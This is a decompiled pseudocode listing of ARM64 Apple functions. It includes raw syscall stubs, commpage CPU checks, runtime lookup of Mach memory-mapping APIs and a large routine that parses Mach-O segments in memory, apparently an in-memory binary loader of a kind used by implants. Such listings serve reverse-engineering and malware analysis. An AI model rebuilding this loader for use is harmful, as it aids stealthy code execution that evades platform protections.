  __int64 v20; // [xsp+0h] [xbp-40h]
  __int64 v21; // [xsp+8h] [xbp-38h]
  __int64 v22; // [xsp+10h] [xbp-30h]
  __int64 v23; // [xsp+18h] [xbp-28h]
  __int64 v24; // [xsp+20h] [xbp-20h]
  __int64 v25; // [xsp+28h] [xbp-18h]
  __int64 v26; // [xsp+30h] [xbp-10h]
  __int64 v27; // [xsp+38h] [xbp-8h]

  v24 = a3;
  v25 = a4;
  v22 = a1;
  v23 = a2;
  sub_F8();
  v11 = v10;
  v12 = v22;
  v13 = v23;
  v14 = v24;
  v15 = v25;
  v16 = v20;
  v20 = v9;
  v21 = v8;
  v22 = v7;
  v23 = v6;
  v24 = v5;
  v25 = v4;
  v26 = v16;
  v27 = v11;
  *(_DWORD *)&v19[v15] = v13;
  v17 = sub_5C(v12, v13, v14, v15);
  return sub_1054(v17);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_1054
// Address:  0x1054  Size: 88 bytes
// Calls:    sub_F8, sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_1054(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // x19
  __int64 v5; // x20
  __int64 v6; // x21
  __int64 v7; // x22
  __int64 v8; // x0
  __int64 v9; // x10
  __int64 v10; // x0
  __int64 v11; // x1
  __int64 v12; // x2
  __int64 v13; // x3
  __int64 v14; // x0
  _BYTE v16[16]; // [xsp-10h] [xbp-50h]
  __int64 v17; // [xsp+0h] [xbp-40h]
  __int64 v18; // [xsp+10h] [xbp-30h]
  __int64 v19; // [xsp+18h] [xbp-28h]
  __int64 v20; // [xsp+20h] [xbp-20h]
  __int64 v21; // [xsp+28h] [xbp-18h]
  __int64 v22; // [xsp+30h] [xbp-10h]
  __int64 v23; // [xsp+38h] [xbp-8h]

  v20 = a3;
  v21 = a4;
  v18 = a1;
  v19 = a2;
  sub_F8();
  v9 = v8;
  v10 = v18;
  v11 = v19;
  v12 = v20;
  v13 = v21;
  v18 = v7;
  v19 = v6;
  v20 = v5;
  v21 = v4;
  v22 = v17;
  v23 = v9;
  *(_DWORD *)&v16[v13] = v11;
  v14 = sub_5C(v10, v11, v12, v13);
  return sub_10AC(v14);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_10AC
// Address:  0x10AC  Size: 64 bytes
// Calls:    sub_ECC, sub_5C
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

bool sub_10AC()
{
  return (unsigned int)sub_ECC() != 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_10EC
// Address:  0x10EC  Size: 440 bytes
// Calls:    sub_5C, sub_ECC, sub_EAC, sub_EBC, sub_EC4, sub_EB4
// Xrefs:    55 callers
////////////////////////////////////////////////////////////////////////

void sub_10EC()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_1314
// Address:  0x1314  Size: 28 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

__int64 sub_1314()
{
  __int64 result; // x0

  __asm { SVC             0x80 }
  if ( _CF )
    return -1;
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_1330
// Address:  0x1330  Size: 28 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 sub_1330()
{
  __int64 result; // x0

  __asm { SVC             0x80 }
  if ( _CF )
    return -1;
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_13A0
// Address:  0x13A0  Size: 28 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

__int64 sub_13A0()
{
  __int64 result; // x0

  __asm { SVC             0x80 }
  if ( _CF )
    return -1;
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_1440
// Address:  0x1440  Size: 208 bytes
// Calls:    sub_5C
// Xrefs:    4 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_1440(__int64 result, unsigned __int64 a2)
{
  unsigned __int64 i; // [xsp+8h] [xbp-28h]

  for ( i = 0; i < a2; ++i )
    *(_BYTE *)(result + i) = 0;
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_1510
// Address:  0x1510  Size: 68 bytes
// Calls:    sub_1440, sub_5C
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_1510(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  sub_1440(a2, a3);
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_1554
// Address:  0x1554  Size: 300 bytes
// Calls:    sub_5C
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_1554(__int64 a1, int *a2)
{
  int v2; // w9
  int v4; // w10
  BOOL v5; // w8
  int v6; // w8

  v2 = MEMORY[0xFFFFFC080];
  if ( MEMORY[0xFFFFFC080] <= 131287966 )
  {
    if ( MEMORY[0xFFFFFC080] != -2023363094 && MEMORY[0xFFFFFC080] != -634136515 )
    {
      if ( MEMORY[0xFFFFFC080] == -400654602 )
      {
LABEL_11:
        v4 = 1;
LABEL_15:
        *(_DWORD *)(a1 + 224) = MEMORY[0xFFFFFC080];
        goto LABEL_19;
      }
LABEL_24:
      v6 = 0;
      *(_DWORD *)(a1 + 224) = MEMORY[0xFFFFFC080];
      goto LABEL_23;
    }
  }
  else
  {
    if ( MEMORY[0xFFFFFC080] <= 678884788 )
    {
      if ( MEMORY[0xFFFFFC080] != 131287967 )
      {
        if ( MEMORY[0xFFFFFC080] != 458787763 )
          goto LABEL_24;
        goto LABEL_16;
      }
      goto LABEL_11;
    }
    if ( MEMORY[0xFFFFFC080] != 678884789 )
    {
      if ( MEMORY[0xFFFFFC080] == 1176831186 )
      {
        v4 = 2;
        goto LABEL_15;
      }
      goto LABEL_24;
    }
  }
LABEL_16:
  *(_DWORD *)(a1 + 224) = MEMORY[0xFFFFFC080];
  if ( v2 == -1829029944 )
  {
    v5 = (MEMORY[0xFFFFFC013] & 4) == 0;
    v4 = 3;
    goto LABEL_20;
  }
  v4 = 3;
LABEL_19:
  v5 = MEMORY[0xFFFFFC026] == 128;
LABEL_20:
  if ( v5 )
    v6 = v4;
  else
    v6 = 0;
LABEL_23:
  *a2 = v6;
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_1680
// Address:  0x1680  Size: 1052 bytes
// Calls:    sub_5C, sub_10EC
// Xrefs:    2 callers
// Strings:  "dyldVersionNumber", "vm_region_64", "getpid", "proc_pidinfo", "mach_make_memory_entry", "vm_map", "kevent_id", "vm_protect", "vm_allocate", "vm_protect"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_1680(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v7; // x21
  double *v8; // x0
  __int64 v9; // x2
  __int64 v10; // x3
  __int64 v11; // x0
  __int64 result; // x0
  __int64 v13; // x2
  __int64 v14; // x3
  __int64 v15; // x2
  __int64 v16; // x3
  __int64 v17; // x0
  __int64 v18; // x0
  __int64 v19; // x1
  __int64 v20; // x2
  __int64 v21; // x3
  __int64 v22; // x0
  int v23; // w8
  __int64 v24; // x2
  __int64 v25; // x3
  __int64 v26; // x0
  __int64 v27; // x0
  __int64 v28; // x8
  __int64 v29; // x9
  unsigned __int64 v30; // x8
  __int64 v31; // x2
  __int64 v32; // x3
  __int64 v33; // x0
  unsigned __int64 v34; // x8
  unsigned __int64 v35; // x8
  __int64 v36; // x0
  __int64 v37; // x2
  __int64 v38; // x3
  __int64 v39; // x0
  __int64 v40; // x8
  __int64 v41; // x9
  __int64 v42; // x0
  __int64 v43; // x8
  __int64 v44; // [xsp+10h] [xbp-B0h] BYREF
  int v45; // [xsp+1Ch] [xbp-A4h]
  __int64 v46[12]; // [xsp+20h] [xbp-A0h] BYREF
  __int64 v47; // [xsp+80h] [xbp-40h] BYREF
  __int64 v48; // [xsp+88h] [xbp-38h] BYREF

  v7 = 106501;
  sub_5C(-2, (__int64)"dyldVersionNumber", a3, a4);
  sub_10EC();
  if ( !v8 )
    return 106501;
  if ( *v8 >= 900.0 )
  {
    sub_5C(-2, (__int64)"getpid", v9, v10);
    sub_10EC();
    if ( !v17 )
      return v7;
    sub_5C(-2, (__int64)"proc_pidinfo", v15, v16);
    sub_10EC();
    if ( !v18 )
      return v7;
    v22 = sub_5C(v18, v19, v20, v21);
    if ( (int)sub_5C(v22, 7, a3, (__int64)v46) <= 0 )
      return 2147483653LL;
    v47 = v46[11];
    v48 = v46[10];
  }
  else
  {
    sub_5C(-2, (__int64)&loc_76D8, v9, v10);
    sub_10EC();
    if ( !v11 )
      return 106501;
    v47 = 0;
    v48 = a3;
    LODWORD(v44) = 9;
    result = sub_5C(a2, (__int64)&v48, (__int64)&v47, 9);
    if ( (_DWORD)result )
      return result;
  }
  v23 = v46[0];
  *(_DWORD *)(a1 + 1480) = v46[0];
  if ( v23 != 7 )
  {
    sub_5C(-2, (__int64)"kevent_id", v13, v14);
    sub_10EC();
    if ( v33 )
    {
      *(_QWORD *)(a1 + 1488) = v48;
      v34 = sub_5C(1, 0, 0, v32);
      result = 49156;
      if ( v34 >= 0xFFFFFFFF && (v34 & 0x3FFF) == 1 )
      {
        v35 = v34 - 1;
        *(_QWORD *)(a1 + 1496) = v35;
        v30 = *(_QWORD *)(a1 + 72) - v48 + v35;
        goto LABEL_22;
      }
    }
    else
    {
      sub_5C(-2, (__int64)"vm_protect", v31, v32);
      sub_10EC();
      v43 = v42;
      result = 106501;
      if ( v43 )
      {
        result = sub_5C(a2, v48, v47, 0);
        if ( !(_DWORD)result )
          return 0;
      }
    }
    return result;
  }
  if ( *(_BYTE *)(a1 + 1473) )
  {
    if ( !*(_BYTE *)(a1 + 1477) )
    {
      v46[0] = v47;
      v44 = 0;
      v45 = 0;
      sub_5C(-2, (__int64)"mach_make_memory_entry", v13, v14);
      sub_10EC();
      if ( v26 )
      {
        sub_5C(-2, (__int64)"vm_map", v24, v25);
        sub_10EC();
        if ( v27 )
        {
          v7 = sub_5C(a2, (__int64)v46, v48, 3);
          if ( !(_DWORD)v7 )
          {
            v7 = sub_5C(a2, (__int64)&v44, v46[0], 0);
            if ( !(_DWORD)v7 )
            {
              v28 = v48;
              *(_QWORD *)(a1 + 1488) = v48;
              v29 = v44;
              *(_QWORD *)(a1 + 1496) = v44;
              v30 = *(_QWORD *)(a1 + 72) - v28 + v29;
LABEL_22:
              *(_QWORD *)(a1 + 72) = v30;
              return 0;
            }
          }
        }
      }
      return v7;
    }
  }
  else if ( !*(_BYTE *)(a1 + 1477) )
  {
    return 0;
  }
  sub_5C(-2, (__int64)"vm_protect", v13, v14);
  sub_10EC();
  if ( !v36 )
    return 106501;
  result = sub_5C(a2, v48, v47, 0);
  if ( !(_DWORD)result )
    return 0;
  if ( (_DWORD)result == 2 )
  {
    v46[0] = 0;
    sub_5C(-2, (__int64)"vm_allocate", v37, v38);
    sub_10EC();
    if ( v39 )
    {
      v7 = sub_5C(a2, (__int64)v46, v47, 1);
      if ( !(_DWORD)v7 )
      {
        v40 = v48;
        *(_QWORD *)(a1 + 1488) = v48;
        v41 = v46[0];
        *(_QWORD *)(a1 + 1496) = v46[0];
        *(_QWORD *)(a1 + 72) = *(_QWORD *)(a1 + 72) - v40 + v41;
        *(_BYTE *)(a1 + 1477) = 0;
        *(_BYTE *)(a1 + 1479) = 1;
        return 0;
      }
    }
    return v7;
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_1A9C
// Address:  0x1A9C  Size: 196 bytes
// Calls:    sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 sub_1A9C()
{
  int v0; // w21
  int v1; // w24
  __int64 v2; // x19
  int v4; // [xsp+4h] [xbp-4Ch] BYREF
  _BYTE v5[24]; // [xsp+8h] [xbp-48h] BYREF

  v0 = 1;
LABEL_2:
  v1 = 1;
  while ( 1 )
  {
    v4 = 5;
    v2 = v1 | (unsigned int)(v0 << 8);
    if ( !(unsigned int)sub_5C(v2, 17, (__int64)v5, (__int64)&v4) && v4 == 5 )
      return v2;
    if ( ++v1 == 4 )
    {
      if ( ++v0 != 4 )
        goto LABEL_2;
      return 0;
    }
  }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_1B60
// Address:  0x1B60  Size: 832 bytes
// Calls:    sub_1EA0, sub_5C, sub_25C, sub_250, sub_1440, sub_280, sub_268, sub_1F78, sub_274
// Xrefs:    4 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_1B60(
        __int64 a1,
        unsigned int a2,
        __int64 a3,
        int *a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        __int64 a11,
        __int64 a12,
        __int64 a13,
        __int64 a14,
        unsigned __int64 a15,
        __int64 a16)
{
  __int64 v19; // x21
  __int64 v21; // x0
  int v22; // w0
  int v23; // w8
  __int64 v24; // x0
  int v25; // w8
  __int64 v26; // x0
  int v27; // w0
  _BYTE v28[405]; // [xsp+Fh] [xbp-221h] BYREF
  int v29; // [xsp+1A4h] [xbp-8Ch]
  __int64 v30; // [xsp+1A8h] [xbp-88h]
  int v31; // [xsp+1B0h] [xbp-80h]
  __int128 v32; // [xsp+1B4h] [xbp-7Ch]
  int v33; // [xsp+1C4h] [xbp-6Ch]
  __int64 v34; // [xsp+1C8h] [xbp-68h]
  int v35; // [xsp+25Ch] [xbp+2Ch]

  v29 = 0;
  v28[0] = 0;
  if ( (unsigned int)sub_1EA0(v28) )
    return 5;
  if ( HIBYTE(a10) )
  {
    sub_25C();
    v19 = v21;
    if ( (_DWORD)v21 )
      return v19;
    v22 = v29;
  }
  else
  {
    sub_250();
    v29 = v22;
    if ( (unsigned int)(v22 + 1) <= 1 )
      return 17;
  }
  v35 = v22;
  sub_1440((__int64)&a14, 8u);
  *(_DWORD *)((char *)&a14 + 3) = 256;
  v23 = *a4;
  if ( (unsigned int)*a4 >= 0x5A )
    v23 = 90;
  a15 = __PAIR64__(v23, a2);
  if ( HIBYTE(a10) )
  {
    do
    {
      do
        sub_280();
      while ( (_DWORD)v24 == 268435463 );
      v19 = v24;
    }
    while ( (_DWORD)v24 == 268451845 );
    sub_268();
  }
  else
  {
    do
    {
      do
        sub_274();
      while ( (_DWORD)v26 == 268435463 );
      v19 = v26;
    }
    while ( (_DWORD)v26 == 268451845 );
    v30 = 0x2880000014LL;
    v31 = v35;
    v32 = xmmword_75A0;
    v33 = v35;
    v34 = 0x10000000000000LL;
    do
    {
      do
        sub_274();
      while ( v27 == 268435463 );
    }
    while ( v27 == 268451845 );
  }
  if ( !(_DWORD)v19 )
  {
    v25 = *a4;
    if ( (unsigned int)*a4 < HIDWORD(a15) )
    {
      v19 = 4294966989LL;
    }
    else
    {
      v25 = HIDWORD(a15);
      v19 = 0;
    }
    sub_1F78(a3, &a16, (unsigned int)(4 * v25));
    *a4 = HIDWORD(a15);
  }
  return v19;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_1EA0
// Address:  0x1EA0  Size: 216 bytes
// Calls:    sub_28C, sub_2008, sub_209C, sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_1EA0(bool *a1)
{
  __int64 v1; // x19
  int v3; // w0
  _BYTE *v4; // x0
  _BYTE v6[26]; // [xsp+Eh] [xbp-42h] BYREF
  __int64 v7; // [xsp+28h] [xbp-28h]

  v1 = 708609;
  if ( a1 )
  {
    v7 = 26;
    sub_28C();
    if ( v3 )
    {
      return 708619;
    }
    else
    {
      v6[v7] = 0;
      v4 = (_BYTE *)sub_2008(v6);
      if ( v4 )
      {
        *v4 = 0;
        v1 = 0;
        *a1 = (int)sub_209C(v6) > 21;
      }
      else
      {
        return 708628;
      }
    }
  }
  return v1;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_1F78
// Address:  0x1F78  Size: 144 bytes
// Calls:    sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_1F78(__int64 result, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 i; // [xsp+0h] [xbp-30h]

  for ( i = 0; i < a3; ++i )
    *(_BYTE *)(result + i) = *(_BYTE *)(a2 + i);
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_2008
// Address:  0x2008  Size: 148 bytes
// Calls:    sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

char *__fastcall sub_2008(char *a1)
{
  char v2; // [xsp+Bh] [xbp-15h]

  do
  {
    v2 = *a1;
    if ( *a1 == 46 )
      return a1;
    ++a1;
  }
  while ( v2 );
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_209C
// Address:  0x209C  Size: 196 bytes
// Calls:    sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_209C(__int64 a1)
{
  bool v1; // w8
  int i; // [xsp+0h] [xbp-10h]
  unsigned int v4; // [xsp+4h] [xbp-Ch]

  v4 = 0;
  for ( i = 0; ; ++i )
  {
    v1 = 0;
    if ( *(_BYTE *)(a1 + i) )
    {
      v1 = 0;
      if ( *(char *)(a1 + i) >= 48 )
        v1 = *(char *)(a1 + i) <= 57;
    }
    if ( !v1 )
      break;
    v4 = *(char *)(a1 + i) - 48 + 10 * v4;
  }
  return v4;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_2200
// Address:  0x2200  Size: 72 bytes
// Calls:    sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

_QWORD *__fastcall sub_2200(_QWORD *result)
{
  result[6] = sub_2248;
  result[7] = sub_464C;
  result[38] = sub_4748;
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_2248
// Address:  0x2248  Size: 9220 bytes
// Calls:    sub_4B68, sub_5B4C, sub_10EC, sub_4DD4, sub_5C, sub_4C18, sub_5C74, sub_4994, sub_5CF4, sub_5E10, sub_66BC, sub_4E38, sub_6E74, sub_4CB4, sub_5480
// Xrefs:    2 callers
// Strings:  "__PAGEZERO", "__TEXT", "__DATA", "__LINKEDIT", "__eh_frame", "__unwind_info", "__x", "__stubs", "__auth_stubs", "__objc_stubs"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_2248(_QWORD *a1, _DWORD *a2, unsigned int a3, _QWORD *a4)
{
  __int64 v8; // x22
  bool v9; // zf
  bool v10; // zf
  __int64 v12; // x0
  __int64 v13; // x21
  unsigned __int64 v14; // x28
  __int64 v15; // x23
  __int64 v16; // x0
  int *v17; // x8
  int v18; // w9
  unsigned int v20; // w8
  __int64 v21; // x25
  signed int v22; // w20
  unsigned __int64 v23; // x21
  unsigned int v24; // w8
  int v25; // w26
  _DWORD *v26; // x8
  signed __int64 v29; // x9
  char *v30; // x9
  unsigned __int64 v31; // x10
  unsigned __int64 v32; // x11
  unsigned int v34; // w8
  _DWORD *v36; // x15
  int v37; // w8
  unsigned int v38; // w10
  char v40; // w9
  int v41; // w9
  __int64 v42; // x24
  __int64 v43; // x23
  _DWORD *v44; // x10
  unsigned __int64 v45; // x13
  int v46; // w28
  __int64 v47; // x0
  __int64 v48; // x8
  __int64 v49; // x9
  __int64 v50; // x8
  __int64 v51; // x26
  unsigned int v52; // w25
  unsigned __int64 v53; // x23
  int v54; // w8
  _QWORD *v55; // x19
  int v56; // w0
  int v57; // w13
  char v58; // w8
  unsigned int v59; // w9
  unsigned __int64 v60; // x8
  unsigned __int64 v61; // x8
  unsigned __int64 v62; // x22
  unsigned __int64 v63; // x9
  unsigned __int64 v64; // x2
  unsigned __int64 v65; // x27
  __int64 v66; // x11
  __int64 v67; // x10
  unsigned __int64 v68; // x12
  __int64 v69; // x24
  unsigned __int64 v70; // x9
  unsigned __int64 v71; // x26
  unsigned __int64 v72; // x9
  unsigned __int64 v73; // x10
  int v74; // w26
  __int64 v75; // x22
  unsigned __int64 v76; // x24
  _QWORD *v77; // x19
  unsigned int v78; // w0
  unsigned __int64 v79; // x27
  unsigned __int64 v80; // x8
  int v82; // w8
  char v83; // w8
  unsigned int **v84; // x24
  __int64 v85; // x8
  __int64 v86; // x27
  unsigned int *v87; // x20
  __int64 v88; // x28
  __int64 v89; // x19
  char *v90; // x21
  unsigned int *v91; // x25
  unsigned __int64 v92; // x8
  __int64 v93; // x4
  int v94; // w23
  _QWORD *v95; // x26
  __int64 v96; // x0
  __int64 v98; // x24
  __int64 v99; // x0
  unsigned int *v100; // x24
  __int64 v101; // x8
  unsigned int *v103; // x8
  __int64 v104; // x1
  __int64 v105; // x21
  __int64 v106; // x24
  __int64 v107; // x19
  __int64 v108; // x20
  __int64 v109; // x25
  __int64 v110; // x0
  _DWORD *v111; // x23
  __int64 v112; // x24
  char *v113; // x27
  unsigned __int64 v114; // x25
  char v115; // w26
  unsigned int v116; // t1
  __int64 v117; // x0
  int v118; // w8
  __int64 v119; // x0
  __int64 v120; // x8
  unsigned int v121; // w10
  char *v122; // x9
  char v123; // w11
  char v124; // t1
  unsigned __int64 v125; // x12
  unsigned __int64 v126; // x8
  unsigned int v127; // w10
  char v128; // w11
  char v129; // t1
  unsigned __int64 v130; // x12
  unsigned __int64 v131; // x10
  unsigned int v132; // w12
  _DWORD *v133; // x11
  unsigned __int64 v134; // x8
  unsigned int v135; // w10
  char *v136; // x9
  char v137; // w11
  char v138; // t1
  unsigned __int64 v139; // x12
  unsigned __int64 v140; // x9
  _DWORD *v141; // x8
  __int64 v142; // x8
  unsigned int v143; // w10
  char v144; // w11
  char v145; // t1
  unsigned __int64 v146; // x12
  unsigned __int64 v147; // x8
  __int64 v149; // x10
  unsigned int v150; // w11
  char v151; // w12
  char v152; // t1
  unsigned __int64 v153; // x13
  __int64 v154; // x9
  unsigned __int64 v155; // x10
  unsigned int v156; // w11
  __int64 v157; // x8
  unsigned int v158; // w10
  char v159; // w11
  char v160; // t1
  unsigned __int64 v161; // x12
  __int64 v162; // x0
  __int64 v163; // x1
  __int64 v164; // x20
  unsigned int *v165; // x28
  unsigned __int64 v166; // x25
  __int64 v167; // x19
  __int64 v168; // x21
  __int64 v169; // x0
  __int64 v170; // x9
  unsigned int *v171; // x8
  unsigned int *v172; // x9
  unsigned __int64 v173; // x10
  __int64 v174; // x15
  unsigned int v175; // w16
  _QWORD *v176; // x15
  __int64 v178; // x21
  unsigned __int64 v179; // x20
  unsigned __int64 v180; // x8
  unsigned __int64 v181; // x9
  unsigned __int64 v182; // x8
  _QWORD *v184; // x19
  unsigned __int64 v185; // x8
  __int64 v186; // x9
  __int64 v187; // x27
  unsigned int v188; // w28
  unsigned __int64 v189; // x9
  int *v190; // x23
  int v191; // w10
  __int64 v192; // x8
  unsigned __int64 v193; // x11
  unsigned __int64 v194; // x9
  unsigned __int64 v195; // x10
  unsigned __int64 v197; // x8
  bool v198; // cc
  __int64 v199; // x10
  char *v200; // x25
  int v202; // w0
  __int64 v203; // x2
  __int64 v204; // x3
  __int64 v205; // x8
  char *v206; // x26
  __int64 v207; // x0
  __int64 v208; // x8
  __int64 v209; // x25
  __int64 v211; // x0
  _QWORD *v212; // x19
  __int64 v213; // x22
  __int64 v214; // x2
  __int64 v215; // x3
  _QWORD *v216; // x23
  __int64 v217; // x2
  __int64 v218; // x3
  __int64 v219; // x0
  __int64 v220; // x22
  __int64 v221; // x2
  __int64 v222; // x3
  __int64 v223; // x25
  __int64 v224; // x2
  __int64 v225; // x3
  __int64 v226; // x0
  __int64 v227; // x2
  __int64 v228; // x3
  __int64 v229; // x26
  __int64 v230; // x23
  __int64 v231; // x22
  int v232; // w9
  _DWORD *v233; // x8
  unsigned __int16 v234; // w22
  int v235; // w28
  unsigned int *v236; // x8
  __int64 v237; // x26
  unsigned __int64 v238; // x9
  int v239; // w10
  unsigned __int64 *v240; // x14
  unsigned __int64 v241; // x11
  __int64 v242; // x12
  unsigned __int64 v243; // x25
  unsigned __int64 v244; // x10
  unsigned __int64 v245; // x13
  bool v246; // cc
  bool v247; // cc
  char **v249; // x23
  unsigned __int64 v250; // x10
  unsigned __int64 v251; // x19
  unsigned __int64 v252; // x13
  char *v253; // x9
  unsigned __int64 v254; // x13
  unsigned __int64 v255; // x11
  int v256; // w12
  unsigned int v257; // w13
  _DWORD *v258; // x14
  int v259; // w15
  int v260; // w17
  _DWORD *v261; // x12
  signed int v262; // w14
  unsigned __int64 v263; // x13
  __int64 v264; // x9
  __int64 v265; // x10
  __int64 v266; // x8
  __int64 v267; // x25
  __int64 v268; // x26
  _DWORD *v269; // x28
  unsigned __int64 v270; // x24
  __int64 v271; // x23
  int v272; // w19
  unsigned int v273; // w0
  __int64 v275; // x20
  unsigned __int64 v276; // x10
  unsigned __int64 v277; // x8
  unsigned __int64 v278; // x9
  unsigned __int64 v280; // x10
  unsigned int **v282; // x19
  __int64 v283; // x21
  __int64 v284; // x8
  unsigned int *v285; // x8
  unsigned __int64 v286; // x1
  unsigned __int64 v287; // x8
  __int64 v290; // x9
  int v291; // w27
  unsigned __int64 v292; // x24
  int v293; // w0
  unsigned __int16 v294; // w8
  unsigned __int16 v295; // w8
  unsigned __int16 v296; // w8
  unsigned __int16 v297; // w8
  _QWORD *v298; // x8
  int v299; // w8
  unsigned int v300; // w8
  unsigned int v301; // w9
  const char *v302; // x1
  __int64 v303; // x2
  unsigned __int16 v304; // w8
  unsigned __int16 v305; // w8
  unsigned __int16 v306; // w8
  unsigned __int16 v307; // w8
  __int64 v308; // x22
  __int64 v309; // x28
  unsigned __int64 v310; // x0
  unsigned __int64 v311; // x25
  unsigned __int64 v312; // x0
  unsigned __int64 v313; // x8
  bool v314; // cc
  bool v315; // cf
  __int64 v317; // x0
  __int64 v318; // x22
  __int64 v319; // x0
  __int64 v320; // x3
  int v321; // w8
  __int64 v322; // x2
  unsigned int *v323; // x8
  int v324; // w19
  __int64 v325; // x20
  __int64 v326; // x21
  char v327; // w8
  __int64 v328; // x0
  __int64 v329; // x2
  __int64 v330; // x3
  __int64 v331; // x22
  __int64 v332; // x1
  __int64 v333; // x2
  __int64 v334; // x3
  __int64 v335; // x0
  __int64 v336; // x0
  __int64 v337; // x0
  __int64 v338; // x0
  __int64 v339; // x0
  __int64 v340; // x0
  __int64 v341; // x1
  __int64 v342; // x2
  __int64 v343; // x3
  __int64 v344; // x0
  __int64 v345; // x1
  __int64 v346; // x2
  __int64 v347; // x3
  __int64 v348; // x0
  __int64 v349; // x1
  __int64 v350; // x2
  __int64 v351; // x3
  __int64 v352; // x0
  __int64 v353; // x1
  __int64 v354; // x2
  __int64 v355; // x3
  __int64 v356; // x1
  __int64 v357; // x2
  __int64 v358; // x3
  __int64 v359; // x10
  __int64 v360; // x9
  unsigned int v361; // w19
  __int64 v362; // x20
  __int64 v363; // x22
  unsigned __int64 v364; // x8
  unsigned __int64 v365; // x9
  __int64 v367; // x8
  int v368; // w20
  __int64 v369; // x23
  _DWORD *v370; // x24
  _DWORD *v371; // x19
  unsigned __int64 v372; // x22
  unsigned __int64 v373; // x8
  __int64 v374; // x26
  unsigned int v375; // w27
  unsigned __int64 v376; // x8
  unsigned __int64 v377; // x9
  unsigned __int16 v379; // w8
  unsigned int v380; // w8
  __int64 v381; // x21
  __int64 v382; // x9
  char *v383; // x23
  unsigned __int64 v385; // x26
  char *v386; // x19
  __int64 v387; // x5
  __int64 v388; // x25
  int v389; // w27
  __int64 v390; // [xsp+8h] [xbp-2E8h]
  int v391; // [xsp+8h] [xbp-2E8h]
  _QWORD *v392; // [xsp+10h] [xbp-2E0h]
  __int64 v393; // [xsp+18h] [xbp-2D8h]
  __int64 v394; // [xsp+18h] [xbp-2D8h]
  _QWORD *v395; // [xsp+20h] [xbp-2D0h]
  __int64 *v396; // [xsp+20h] [xbp-2D0h]
  unsigned __int64 v397; // [xsp+28h] [xbp-2C8h]
  unsigned int *v398; // [xsp+28h] [xbp-2C8h]
  __int64 v399; // [xsp+28h] [xbp-2C8h]
  _DWORD *v400; // [xsp+28h] [xbp-2C8h]
  _DWORD *v401; // [xsp+30h] [xbp-2C0h]
  int v402; // [xsp+30h] [xbp-2C0h]
  __int64 *v403; // [xsp+30h] [xbp-2C0h]
  unsigned int v404; // [xsp+38h] [xbp-2B8h]
  int v405; // [xsp+38h] [xbp-2B8h]
  unsigned __int64 *v406; // [xsp+38h] [xbp-2B8h]
  __int64 v407; // [xsp+38h] [xbp-2B8h]
  __int64 v408; // [xsp+38h] [xbp-2B8h]
  _QWORD v409[64]; // [xsp+40h] [xbp-2B0h] BYREF
  unsigned int v410; // [xsp+240h] [xbp-B0h]
  __int64 v411; // [xsp+248h] [xbp-A8h] BYREF
  __int64 v412; // [xsp+250h] [xbp-A0h] BYREF
  __int64 v413; // [xsp+258h] [xbp-98h] BYREF
  unsigned __int64 v414; // [xsp+260h] [xbp-90h] BYREF
  unsigned int *v415; // [xsp+268h] [xbp-88h] BYREF
  _QWORD v416[3]; // [xsp+270h] [xbp-80h] BYREF
  __int64 v417; // [xsp+288h] [xbp-68h] BYREF
  _QWORD v418[2]; // [xsp+290h] [xbp-60h] BYREF

  v8 = 73730;
  sub_4B68(v409, 0, 520);
  if ( !a1 )
    return v8;
  v9 = !a1[5] || a4 == 0;
  v10 = v9 || a2 == 0;
  if ( v10 || a3 == 0 )
    return v8;
  v12 = sub_5B4C(a1, 288, 0);
  if ( !v12 )
    return v8;
  v13 = v12;
  v14 = a3;
  sub_4B68(v12, 0, 288);
  *(_QWORD *)(v13 + 104) = a2;
  *(_QWORD *)(v13 + 160) = a3;
  v15 = a1[2];
  if ( v15 )
  {
    sub_10EC();
    v17 = (int *)(v16 & 0xFFFFFFFFFFFFF000LL);
    do
    {
      v18 = *v17;
      v17 -= 1024;
    }
    while ( v18 != -17958193 );
    v404 = v17[1026] & 0xFFFFFF;
    a2 = *(_DWORD **)(v13 + 104);
